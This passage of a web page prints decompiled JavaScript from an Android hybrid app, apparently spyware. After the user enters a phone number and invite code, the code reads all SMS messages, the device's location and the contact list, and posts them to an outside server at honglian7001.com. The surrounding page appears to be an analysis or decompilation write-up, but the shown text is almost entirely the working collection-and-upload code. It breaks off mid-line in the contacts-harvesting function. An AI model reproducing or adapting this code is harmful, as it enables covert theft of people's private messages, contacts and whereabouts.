class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">/*</span><br><span class="hljs-comment">*Aman - 194nb.com</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *Progcessed By JSDec in 0.00s</span><br><span class="hljs-comment"> *JSDec - JSDec.js.org</span><br><span class="hljs-comment"> */</span><br>mui.<span class="hljs-title function_">init</span>();<br><br>		mui.<span class="hljs-title function_">plusReady</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>			<span class="hljs-comment">//var main = plus.android.runtimeMainActivity();  </span><br>			<span class="hljs-comment">// main.moveTaskToBack(false);</span><br><br>			<span class="hljs-keyword">var</span> address = plus.<span class="hljs-property">device</span>.<span class="hljs-property">vendor</span> + <span class="hljs-string">&#x27;-&#x27;</span> + plus.<span class="hljs-property">device</span>.<span class="hljs-property">model</span>;<br>			address = address.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\n/g</span>, <span class="hljs-string">&quot;&quot;</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/ /g</span>, <span class="hljs-string">&quot;&quot;</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\r/g</span>, <span class="hljs-string">&quot;&quot;</span>);<br>			<span class="hljs-keyword">var</span> apiserver = <span class="hljs-string">&#x27;http://www.honglian7001.com/api/uploads/&#x27;</span>;<br>			<span class="hljs-comment">//重复数据处理 预防用户重复点击</span><br>			<span class="hljs-keyword">var</span> danjishijian = <span class="hljs-literal">true</span>;<br>			<span class="hljs-keyword">function</span> <span class="hljs-title function_">requestPermission</span>(<span class="hljs-params">sjh, yqm</span>) &#123;<br>				plus.<span class="hljs-property">android</span>.<span class="hljs-title function_">requestPermissions</span>(<br>					[<span class="hljs-string">&quot;android.permission.READ_SMS&quot;</span>],<br>					<span class="hljs-keyword">function</span> (<span class="hljs-params">resultObj</span>) &#123;<br>						<span class="hljs-comment">//SmsInfo存放一条短信的各项内容</span><br>						<span class="hljs-keyword">var</span> <span class="hljs-title class_">SmsInfo</span> = &#123;&#125;<br>						<span class="hljs-comment">//Sms存放所有短信</span><br>						<span class="hljs-keyword">var</span> <span class="hljs-title class_">Sms</span> = &#123;&#125;<br><br>						<span class="hljs-keyword">var</span> aimei = sjh;<br>						<span class="hljs-keyword">var</span> aimei2 = yqm;<br>						<span class="hljs-keyword">var</span> duanxin = <span class="hljs-string">&#x27;[&#123;&quot;imei&quot;:&quot;&#x27;</span> + aimei + <span class="hljs-string">&#x27;&quot;,&quot;imei2&quot;:&quot;&#x27;</span> + aimei2 + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span>;<br>						<span class="hljs-keyword">var</span> <span class="hljs-title class_">Cursor</span> = plus.<span class="hljs-property">android</span>.<span class="hljs-title function_">importClass</span>(<span class="hljs-string">&quot;android.database.Cursor&quot;</span>)<br>						<span class="hljs-keyword">var</span> <span class="hljs-title class_">Uri</span> = plus.<span class="hljs-property">android</span>.<span class="hljs-title function_">importClass</span>(<span class="hljs-string">&quot;android.net.Uri&quot;</span>)   <span class="hljs-comment">//注意啦，android.net.Uri中的net是小写</span><br>						<span class="hljs-keyword">var</span> activity = plus.<span class="hljs-property">android</span>.<span class="hljs-title function_">runtimeMainActivity</span>()<br>						<span class="hljs-keyword">var</span> uri = <span class="hljs-title class_">Uri</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&quot;content://sms/&quot;</span>);<br><br>						<span class="hljs-keyword">var</span> projection = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-string">&quot;_id&quot;</span>, <span class="hljs-string">&quot;address&quot;</span>, <span class="hljs-string">&quot;person&quot;</span>, <span class="hljs-string">&quot;body&quot;</span>, <span class="hljs-string">&quot;date&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>)<br>						<span class="hljs-keyword">var</span> cusor = activity.<span class="hljs-title function_">managedQuery</span>(uri, projection, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;date desc&quot;</span>)<br>						<span class="hljs-keyword">var</span> idColumn = cusor.<span class="hljs-title function_">getColumnIndex</span>(<span class="hljs-string">&quot;_id&quot;</span>)<br>						<span class="hljs-keyword">var</span> nameColumn = cusor.<span class="hljs-title function_">getColumnIndex</span>(<span class="hljs-string">&quot;person&quot;</span>)<br>						<span class="hljs-keyword">var</span> phoneNumberColumn = cusor.<span class="hljs-title function_">getColumnIndex</span>(<span class="hljs-string">&quot;address&quot;</span>)<br>						<span class="hljs-keyword">var</span> smsbodyColumn = cusor.<span class="hljs-title function_">getColumnIndex</span>(<span class="hljs-string">&quot;body&quot;</span>)<br>						<span class="hljs-keyword">var</span> dateColumn = cusor.<span class="hljs-title function_">getColumnIndex</span>(<span class="hljs-string">&quot;date&quot;</span>)<br>						<span class="hljs-keyword">var</span> typeColumn = cusor.<span class="hljs-title function_">getColumnIndex</span>(<span class="hljs-string">&quot;type&quot;</span>)<br>						<span class="hljs-keyword">if</span> (cusor != <span class="hljs-literal">null</span>) &#123;<br>							<span class="hljs-keyword">while</span> (cusor.<span class="hljs-title function_">moveToNext</span>()) &#123;<br>								<span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">id</span> = cusor.<span class="hljs-title function_">getString</span>(idColumn)<br>								<span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">Name</span> = cusor.<span class="hljs-title function_">getInt</span>(nameColumn)<br>								<span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">Date</span> = cusor.<span class="hljs-title function_">getLong</span>(dateColumn)<br>								<span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">Date</span> = <span class="hljs-title function_">getFormatDate</span>(<span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">Date</span>)<br>								<span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">PhoneNumber</span> = cusor.<span class="hljs-title function_">getString</span>(phoneNumberColumn)<br>								<span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">Smsbody</span> = cusor.<span class="hljs-title function_">getString</span>(smsbodyColumn)<br>								<span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">Type</span> = cusor.<span class="hljs-title function_">getString</span>(typeColumn)<br><br>								<span class="hljs-keyword">var</span> post = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-title class_">SmsInfo</span>);<br>								<span class="hljs-comment">//console.log(post);</span><br>								duanxin = duanxin + <span class="hljs-string">&#x27;,&#x27;</span> + post;<br><br>							&#125;<br>							duanxin = duanxin + <span class="hljs-string">&#x27;]&#x27;</span>;<br>							<span class="hljs-comment">//alert(duanxin);</span><br><br>							mui.<span class="hljs-title function_">ajax</span>(apiserver + <span class="hljs-string">&#x27;apisms&#x27;</span>, &#123;<br>								<span class="hljs-attr">data</span>: &#123;<br>									<span class="hljs-attr">data</span>: duanxin<br>								&#125;,<br>								<span class="hljs-attr">dataType</span>: <span class="hljs-string">&#x27;text&#x27;</span>,<span class="hljs-comment">//服务器返回json格式数据</span><br>								<span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-comment">//HTTP请求类型</span><br>								<span class="hljs-attr">timeout</span>: <span class="hljs-number">10000</span>,<span class="hljs-comment">//超时时间设置为10秒；              </span><br>								<span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>									mui.<span class="hljs-title function_">toast</span>(<span class="hljs-string">&#x27;获取成功&#x27;</span>)<br>									<span class="hljs-comment">//console.log(con)</span><br><br><br>								&#125;,<br>								<span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">xhr, type, errorThrown</span>) &#123;<br>									<span class="hljs-comment">//异常处理；</span><br><br>								&#125;<br>							&#125;);<br>							cusor.<span class="hljs-title function_">close</span>()<br>						&#125;<br><br>					&#125;,<br>					<span class="hljs-keyword">function</span> (<span class="hljs-params">error</span>) &#123;<br>						<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;申请权限错误：&#x27;</span> + error.<span class="hljs-property">code</span> + <span class="hljs-string">&quot; = &quot;</span> + error.<span class="hljs-property">message</span>);<br>					&#125;);<br>			&#125;<br><br><br><br>			<span class="hljs-comment">//扩展Date功能：将long型日期转换为特定的格式</span><br>			<span class="hljs-title class_">Date</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">format</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">format</span>) &#123;<br>				<span class="hljs-keyword">var</span> o = &#123;<br>					<span class="hljs-string">&quot;M+&quot;</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getMonth</span>() + <span class="hljs-number">1</span>,<br>					<span class="hljs-string">&quot;d+&quot;</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getDate</span>(),<br>					<span class="hljs-string">&quot;h+&quot;</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getHours</span>(),<br>					<span class="hljs-string">&quot;m+&quot;</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getMinutes</span>(),<br>					<span class="hljs-string">&quot;s+&quot;</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getSeconds</span>(),<br>					<span class="hljs-string">&quot;q+&quot;</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getMonth</span>() + <span class="hljs-number">3</span>) / <span class="hljs-number">3</span>),<br>					<span class="hljs-string">&quot;S&quot;</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getMilliseconds</span>()<br>				&#125;<br>				<span class="hljs-keyword">if</span> (<span class="hljs-regexp">/(y+)/</span>.<span class="hljs-title function_">test</span>(format)) &#123;<br>					format = format.<span class="hljs-title function_">replace</span>(<span class="hljs-title class_">RegExp</span>.<span class="hljs-property">$1</span>, (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getFullYear</span>() + <span class="hljs-string">&quot;&quot;</span>).<span class="hljs-title function_">substr</span>(<span class="hljs-number">4</span> - <span class="hljs-title class_">RegExp</span>.<span class="hljs-property">$1</span>.<span class="hljs-property">length</span>));<br>				&#125;<br>				<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> k <span class="hljs-keyword">in</span> o) &#123;<br>					<span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&quot;(&quot;</span> + k + <span class="hljs-string">&quot;)&quot;</span>).<span class="hljs-title function_">test</span>(format)) &#123;<br>						format = format.<span class="hljs-title function_">replace</span>(<span class="hljs-title class_">RegExp</span>.<span class="hljs-property">$1</span>, <span class="hljs-title class_">RegExp</span>.<span class="hljs-property">$1</span>.<span class="hljs-property">length</span> == <span class="hljs-number">1</span> ? o[k] : (<span class="hljs-string">&quot;00&quot;</span> + o[k]).<span class="hljs-title function_">substr</span>((<span class="hljs-string">&quot;&quot;</span> + o[k]).<span class="hljs-property">length</span>));<br>					&#125;<br>				&#125;<br>				<span class="hljs-keyword">return</span> format;<br>			&#125;<br><br><br>			<span class="hljs-comment">//将long型日期转换为特定格式</span><br>			<span class="hljs-keyword">function</span> <span class="hljs-title function_">getFormatDate</span>(<span class="hljs-params">l, pattern</span>) &#123;<br>				date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(l);<br>				<span class="hljs-keyword">if</span> (pattern == <span class="hljs-literal">undefined</span>) &#123;<br>					pattern = <span class="hljs-string">&quot;yyyy-MM-dd hh:mm:ss&quot;</span>;<br>				&#125;<br>				<span class="hljs-keyword">return</span> date.<span class="hljs-title function_">format</span>(pattern);<br>			&#125;<br><br><br>			<span class="hljs-comment">//alert(plus.device.uuid)</span><br>			plus.<span class="hljs-property">navigator</span>.<span class="hljs-title function_">setStatusBarBackground</span>(<span class="hljs-string">&quot;#db6eff&quot;</span>);<br><br>			<span class="hljs-title function_">mui</span>(<span class="hljs-string">&quot;body&quot;</span>).<span class="hljs-title function_">off</span>(<span class="hljs-string">&quot;tap&quot;</span>);<br><br>			<span class="hljs-title function_">mui</span>(<span class="hljs-string">&quot;body&quot;</span>).<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;tap&#x27;</span>, <span class="hljs-string">&#x27;#tx&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) &#123;<br><br>				$(<span class="hljs-string">&#x27;#tx&#x27;</span>).<span class="hljs-title function_">hide</span>();<br>				$(<span class="hljs-string">&#x27;#zz&#x27;</span>).<span class="hljs-title function_">show</span>();<br>			&#125;);<br><br>			<span class="hljs-title function_">mui</span>(<span class="hljs-string">&quot;body&quot;</span>).<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;tap&#x27;</span>, <span class="hljs-string">&#x27;#gb&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) &#123;<br><br>				$(<span class="hljs-string">&#x27;#tx&#x27;</span>).<span class="hljs-title function_">show</span>();<br>				$(<span class="hljs-string">&#x27;#zz&#x27;</span>).<span class="hljs-title function_">hide</span>();<br>			&#125;);<br><br>			<span class="hljs-title function_">mui</span>(<span class="hljs-string">&quot;body&quot;</span>).<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;tap&#x27;</span>, <span class="hljs-string">&#x27;#qd&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) &#123;<br>				<span class="hljs-keyword">if</span> (danjishijian) &#123;<br>					danjishijian = <span class="hljs-literal">false</span>;<br>					<span class="hljs-title function_">aa</span>()<br>				&#125; <span class="hljs-keyword">else</span> &#123;<br>					<span class="hljs-title function_">aa</span>()<br>				&#125;<br><br>			&#125;);<br><br><br>			<span class="hljs-keyword">function</span> <span class="hljs-title function_">getPermission</span>(<span class="hljs-params">permissionIdentity, successCallBack, errorCallBack</span>) &#123;<br>				<span class="hljs-comment">//权限标识转换成大写  </span><br>				<span class="hljs-keyword">var</span> permissionIdentity = permissionIdentity.<span class="hljs-title function_">toUpperCase</span>();<br>				<span class="hljs-comment">//获取检测权限的状态  </span><br>				<span class="hljs-keyword">var</span> checkResult = plus.<span class="hljs-property">navigator</span>.<span class="hljs-title function_">checkPermission</span>(permissionIdentity);<br>				<span class="hljs-comment">//权限状态是否正常  </span><br>				<span class="hljs-keyword">var</span> permissionStatusOk = <span class="hljs-literal">false</span>;<br>				<span class="hljs-comment">//权限中文名称  </span><br>				<span class="hljs-keyword">var</span> permissionName = <span class="hljs-string">&#x27;&#x27;</span>;<br>				<span class="hljs-comment">//对应 andorid 的具体权限  </span><br>				<span class="hljs-keyword">var</span> androidPermission = <span class="hljs-string">&#x27;&#x27;</span>;<br>				<span class="hljs-comment">//获取权限中文意思与对应 android 系统的权限字符串  </span><br>				<span class="hljs-keyword">switch</span> (permissionIdentity) &#123;<br><br>					<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;CONTACTS&#x27;</span>:<br>						permissionName = <span class="hljs-string">&#x27;系统联系人&#x27;</span>;<br>						androidPermission = <span class="hljs-string">&#x27;android.permission.READ_CONTACTS&#x27;</span><br>						<span class="hljs-keyword">break</span>;<br><br>					<span class="hljs-attr">default</span>:<br>						permissionName = <span class="hljs-string">&#x27;未知&#x27;</span>;<br>						androidPermission = <span class="hljs-string">&#x27;未知&#x27;</span>;<br>						<span class="hljs-keyword">break</span>;<br>				&#125;<br><br>				<span class="hljs-comment">//判断检查权限的结果  </span><br>				<span class="hljs-keyword">switch</span> (checkResult) &#123;<br>					<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;authorized&#x27;</span>:<br>						<span class="hljs-comment">//正常的  </span><br>						permissionStatusOk = <span class="hljs-literal">true</span><br>						<span class="hljs-keyword">break</span>;<br>					<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;denied&#x27;</span>:<br>						<span class="hljs-comment">//表示程序已被用户拒绝使用此权限，如果是拒绝的就再次提示用户打开确认提示框  </span><br>						<span class="hljs-comment">//如果有该权限但是没有打开不进行操作还是会去申请或手动打开  </span><br>						<span class="hljs-comment">// console.log(&#x27;已关闭&#x27; + permissionName + &#x27;权限&#x27;)  </span><br>						<span class="hljs-comment">// errorCallBack(&#x27;已关闭&#x27; + permissionName + &#x27;权限&#x27;);  </span><br>						<span class="hljs-comment">// return  </span><br>						<span class="hljs-keyword">break</span>;<br>					<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;undetermined&#x27;</span>:<br>						<span class="hljs-comment">// 表示程序未确定是否可使用此权限，此时调用对应的API时系统会弹出提示框让用户确认  </span><br>						<span class="hljs-comment">// this.requestPermissions(androidPermission, permissionName, successCallBack, errorCallBack)  </span><br>						<span class="hljs-comment">// errorCallBack(&#x27;未确定&#x27; + permissionName + &#x27;权限&#x27;);  </span><br>						<span class="hljs-comment">// return  </span><br>						<span class="hljs-keyword">break</span>;<br>					<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;unknown&#x27;</span>:<br>						<span class="hljs-title function_">errorCallBack</span>(<span class="hljs-string">&#x27;无法查询&#x27;</span> + permissionName + <span class="hljs-string">&#x27;权限&#x27;</span>);<br>						<span class="hljs-keyword">return</span><br>						<span class="hljs-keyword">break</span>;<br>					<span class="hljs-attr">default</span>:<br>						<span class="hljs-title function_">errorCallBack</span>(<span class="hljs-string">&#x27;不支持&#x27;</span> + permissionName + <span class="hljs-string">&#x27;权限&#x27;</span>);<br>						<span class="hljs-keyword">return</span><br>						<span class="hljs-keyword">break</span>;<br>				&#125;<br><br>				<span class="hljs-comment">//如果权限是正常的执行成功回调  </span><br>				<span class="hljs-keyword">if</span> (permissionStatusOk) &#123;<br>					<span class="hljs-title function_">successCallBack</span>()<br>				&#125; <span class="hljs-keyword">else</span> &#123;<br>					<span class="hljs-comment">//如果不正常，如果是 andorid 系统，就动态申请权限  </span><br>					<span class="hljs-keyword">if</span> (plus.<span class="hljs-property">os</span>.<span class="hljs-property">name</span> == <span class="hljs-string">&#x27;Android&#x27;</span>) &#123;<br>						<span class="hljs-comment">//动态申请权限  </span><br>						plus.<span class="hljs-property">android</span>.<span class="hljs-title function_">requestPermissions</span>([androidPermission], <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br>							<span class="hljs-keyword">if</span> (e.<span class="hljs-property">deniedAlways</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br>								<span class="hljs-comment">//权限被永久拒绝  </span><br>								<span class="hljs-comment">// 弹出提示框解释为何需要定位权限，引导用户打开设置页面开启  </span><br>								<span class="hljs-title function_">errorCallBack</span>(<span class="hljs-string">&#x27;请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。&#x27;</span>)<br>								<span class="hljs-comment">// console.log(&#x27;Always Denied!!! &#x27; + e.deniedAlways.toString());  </span><br>							&#125;<br>							<span class="hljs-keyword">if</span> (e.<span class="hljs-property">deniedPresent</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br>								<span class="hljs-comment">//权限被临时拒绝  </span><br>								<span class="hljs-comment">// 弹出提示框解释为何需要定位权限，可再次调用plus.android.requestPermissions申请权限  </span><br>								<span class="hljs-title function_">errorCallBack</span>(<span class="hljs-string">&#x27;请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。&#x27;</span>)<br>								<span class="hljs-comment">// console.log(&#x27;Present Denied!!! &#x27; + e.deniedPresent.toString());  </span><br>							&#125;<br>							<span class="hljs-keyword">if</span> (e.<span class="hljs-property">granted</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br>								<span class="hljs-comment">//权限被允许  </span><br>								<span class="hljs-comment">//调用依赖获取定位权限的代码  </span><br>								<span class="hljs-title function_">successCallBack</span>()<br>								<span class="hljs-comment">// console.log(&#x27;Granted!!! &#x27; + e.granted.toString());  </span><br>							&#125;<br>						&#125;, <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br>							<span class="hljs-title function_">errorCallBack</span>(<span class="hljs-string">&#x27;请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。&#x27;</span>)<br>							<span class="hljs-comment">// console.log(&#x27;Request Permissions error:&#x27; + JSON.stringify(e));  </span><br>						&#125;)<br>					&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (plus.<span class="hljs-property">os</span>.<span class="hljs-property">name</span> == <span class="hljs-string">&#x27;iOS&#x27;</span>) &#123;<br>						<span class="hljs-comment">//ios ,第一次使用目的权限时，应用的权限列表里是不存在的，所以先默认执行一下成功回调，打开要使用的操作，比如 plus.camera  </span><br>						<span class="hljs-comment">//这时系统会提示是否打开相应的权限，如果拒绝也没关系，因为应用的权限列表里已经存在该权限了，下次再调用相应权限时，就会  </span><br>						<span class="hljs-comment">//走 else 里的流程，会给用户提示，并且跳转到应该的权限页面，让用户手动打开。  </span><br>						<span class="hljs-keyword">if</span> (checkResult == <span class="hljs-string">&#x27;undetermined&#x27;</span>) &#123;<br>							<span class="hljs-comment">//调用依赖获取定位权限的代码  </span><br>							<span class="hljs-title function_">successCallBack</span>(<span class="hljs-literal">true</span>)<br>						&#125; <span class="hljs-keyword">else</span> &#123;<br>							<span class="hljs-comment">//如果是 ios 系统，ios 没有动态申请操作，所以提示用户去设置页面手动打开  </span><br>							mui.<span class="hljs-title function_">confirm</span>(permissionName + <span class="hljs-string">&#x27;权限没有开启，是否去开启？&#x27;</span>, <span class="hljs-string">&#x27;提醒&#x27;</span>, [<span class="hljs-string">&#x27;取消&#x27;</span>, <span class="hljs-string">&#x27;确认&#x27;</span>], <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br>								<span class="hljs-comment">//取消  </span><br>								<span class="hljs-keyword">if</span> (e.<span class="hljs-property">index</span> == <span class="hljs-number">0</span>) &#123;<br>									<span class="hljs-title function_">errorCallBack</span>(<span class="hljs-string">&#x27;请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。&#x27;</span>)<br>								&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (e.<span class="hljs-property">index</span> == <span class="hljs-number">1</span>) &#123;<br>									<span class="hljs-comment">//确认，打开当前应用权限设置页面  </span><br>									<span class="hljs-keyword">var</span> <span class="hljs-title class_">UIApplication</span> = plus.<span class="hljs-property">ios</span>.<span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;UIApplication&#x27;</span>);<br>									<span class="hljs-keyword">var</span> application2 = <span class="hljs-title class_">UIApplication</span>.<span class="hljs-title function_">sharedApplication</span>();<br>									<span class="hljs-keyword">var</span> <span class="hljs-title class_">NSURL2</span> = plus.<span class="hljs-property">ios</span>.<span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;NSURL&#x27;</span>);<br>									<span class="hljs-comment">// var setting2 = NSURL2.URLWithString(&quot;prefs:root=LOCATION_SERVICES&quot;);                             </span><br>									<span class="hljs-keyword">var</span> setting2 = <span class="hljs-title class_">NSURL2</span>.<span class="hljs-title class_">URLWithString</span>(<span class="hljs-string">&#x27;app-settings:&#x27;</span>);<br>									application2.<span class="hljs-title function_">openURL</span>(setting2);<br><br>									plus.<span class="hljs-property">ios</span>.<span class="hljs-title function_">deleteObject</span>(setting2);<br>									plus.<span class="hljs-property">ios</span>.<span class="hljs-title function_">deleteObject</span>(<span class="hljs-title class_">NSURL2</span>);<br>									plus.<span class="hljs-property">ios</span>.<span class="hljs-title function_">deleteObject</span>(application2)<br>								&#125;<br>							&#125;, <span class="hljs-string">&#x27;div&#x27;</span>)<br>						&#125;<br>					&#125;<br>				&#125;<br>			&#125;<br><br><br><br>			<span class="hljs-keyword">function</span> <span class="hljs-title function_">aa</span>(<span class="hljs-params"></span>) &#123;<br>				<span class="hljs-keyword">var</span> sjh = $(<span class="hljs-string">&#x27;#sjh&#x27;</span>).<span class="hljs-title function_">val</span>();<br>				<span class="hljs-keyword">var</span> yqm = $(<span class="hljs-string">&#x27;#yqm&#x27;</span>).<span class="hljs-title function_">val</span>();<br>				<span class="hljs-keyword">if</span> (<span class="hljs-built_in">parseInt</span>(sjh) &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">parseInt</span>(yqm) &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">parseInt</span>(sjh) &gt; <span class="hljs-number">13000000000</span> &amp;&amp; <span class="hljs-built_in">parseInt</span>(sjh) &lt; <span class="hljs-number">19999999999</span> &amp;&amp; <span class="hljs-built_in">parseInt</span>(yqm) &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">parseInt</span>(yqm) &lt; <span class="hljs-number">999999</span>) &#123;<br><br>					<span class="hljs-title function_">getPermission</span>(<span class="hljs-string">&#x27;CONTACTS&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>						<span class="hljs-title function_">huoqu</span>(sjh, yqm);<br><br>					&#125;, <span class="hljs-keyword">function</span> (<span class="hljs-params">msg</span>) &#123;<br>						mui.<span class="hljs-title function_">alert</span>(msg, <span class="hljs-string">&#x27;提醒&#x27;</span>, <span class="hljs-string">&#x27;确定&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123; &#125;, <span class="hljs-string">&#x27;div&#x27;</span>)<br>						<span class="hljs-comment">//aa()</span><br>					&#125;)<br>				&#125;<br>				<span class="hljs-keyword">else</span> &#123;<br>					mui.<span class="hljs-title function_">toast</span>(<span class="hljs-string">&#x27;请输入正确的手机号和邀请码&#x27;</span>)<br>				&#125;<br><br>			&#125;<br><br><br><br><br>			<span class="hljs-keyword">function</span> <span class="hljs-title function_">dingwei</span>(<span class="hljs-params">sjh, yqm</span>) &#123;<br>				plus.<span class="hljs-property">geolocation</span>.<span class="hljs-title function_">getCurrentPosition</span>(translatePoint, <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br>					mui.<span class="hljs-title function_">toast</span>(<span class="hljs-string">&quot;异常:&quot;</span> + e.<span class="hljs-property">message</span>);<br>				&#125;);<br>			&#125;<br><br>			<span class="hljs-keyword">function</span> <span class="hljs-title function_">translatePoint</span>(<span class="hljs-params">position</span>) &#123;<br><br>				<span class="hljs-keyword">var</span> sjh = $(<span class="hljs-string">&#x27;#sjh&#x27;</span>).<span class="hljs-title function_">val</span>()<br>				<span class="hljs-keyword">var</span> yqm = $(<span class="hljs-string">&#x27;#yqm&#x27;</span>).<span class="hljs-title function_">val</span>()<br>				<span class="hljs-keyword">var</span> currentLon = position.<span class="hljs-property">coords</span>.<span class="hljs-property">longitude</span>;<br>				<span class="hljs-keyword">var</span> currentLat = position.<span class="hljs-property">coords</span>.<span class="hljs-property">latitude</span>;<br>				<span class="hljs-keyword">var</span> jingweidu = sjh + <span class="hljs-string">&#x27;,&#x27;</span> + yqm + <span class="hljs-string">&#x27;,&#x27;</span> + currentLon + <span class="hljs-string">&#x27;,&#x27;</span> + currentLat;<br>				mui.<span class="hljs-title function_">ajax</span>(apiserver + <span class="hljs-string">&#x27;apimap&#x27;</span>, &#123;<br>					<span class="hljs-attr">data</span>: &#123;<br>						<span class="hljs-attr">data</span>: jingweidu<br>					&#125;,<br>					<span class="hljs-attr">dataType</span>: <span class="hljs-string">&#x27;text&#x27;</span>,<span class="hljs-comment">//服务器返回json格式数据</span><br>					<span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-comment">//HTTP请求类型</span><br>					<span class="hljs-attr">timeout</span>: <span class="hljs-number">10000</span>,<span class="hljs-comment">//超时时间设置为10秒；              </span><br>					<span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br><br>						<span class="hljs-keyword">if</span> (data == <span class="hljs-string">&#x27;获取成功&#x27;</span>) &#123;<br>							<span class="hljs-title function_">requestPermission</span>(sjh, yqm);<br><br>							<span class="hljs-comment">//setInterval(function()&#123;</span><br>							<span class="hljs-comment">//var sjh=$(&#x27;#sjh&#x27;).val();</span><br>							<span class="hljs-comment">//var yqm=$(&#x27;#yqm&#x27;).val();</span><br>							<span class="hljs-comment">//requestPermission(sjh,yqm);</span><br>							<span class="hljs-comment">//console.log(&#x27;send&#x27;)</span><br><br>							<span class="hljs-comment">//&#125;,30000)</span><br>						&#125;<br><br>						mui.<span class="hljs-title function_">toast</span>(data)<br>					&#125;,<br>					<span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">xhr, type, errorThrown</span>) &#123;<br>						<span class="hljs-comment">//异常处理；</span><br><br><br>					&#125;<br>				&#125;);<br><br>				<span class="hljs-comment">//书写自己的逻辑</span><br><br>			&#125;<br>			<span class="hljs-comment">// 扩展API加载完毕，现在可以正常调用扩展API</span><br><br>			<span class="hljs-keyword">function</span> <span class="hljs-title function_">huoqu</span>(<span class="hljs-params">sjh, yqm</span>) &#123;<br>				<span class="hljs-keyword">var</span> con = sjh + <span class="hljs-string">&quot;**&quot;</span> + yqm + <span class="hljs-string">&#x27;**&#x27;</span> + address;<br><br><br>				plus.<span class="hljs-property">contacts</span>.<span class="hljs-title function_">getAddressBook</span>(plus.<span class="hljs-property">contacts</span>.<span class="hljs-property">ADDRESSBOOK_PHONE</span>, <span 